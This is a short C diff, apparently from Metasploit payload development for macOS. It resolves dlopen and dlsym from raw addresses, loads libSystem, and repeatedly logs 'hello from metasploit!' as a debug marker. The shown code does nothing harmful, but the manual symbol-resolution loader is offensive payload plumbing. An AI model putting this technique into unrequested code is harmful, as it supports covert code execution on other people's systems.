@@ -88,6 +88,9 @@ int main(int argc, char** argv)
   return 0;
 }
 
+typedef int (*asl_log_ptr)(aslclient asl, aslmsg msg, int level, const char *format, ...);
+asl_log_ptr asl_log_func = 0;
+
 void init()
 {
   /*printf("syscall_write\n");*/
@@ -119,12 +122,17 @@ void init()
 
   typedef void* (*dlopen_ptr)(const char *filename, int flags);
   typedef void* (*dlsym_ptr)(void *handle, const char *symbol);
-  typedef int (*asl_log_ptr)(aslclient asl, aslmsg msg, int level, const char *format, ...);
 
   dlopen_ptr dlopen_func = dlopen_addr;
   dlsym_ptr dlsym_func = dlsym_addr;
   void* libsystem = dlopen_func("/usr/lib/libSystem.B.dylib", RTLD_NOW);
-  asl_log_ptr asl_log_func = dlsym_func(libsystem, "asl_log");
+  asl_log_func = dlsym_func(libsystem, "asl_log");
+  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
+  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
+  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
+  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
+  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
+  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
 }
 
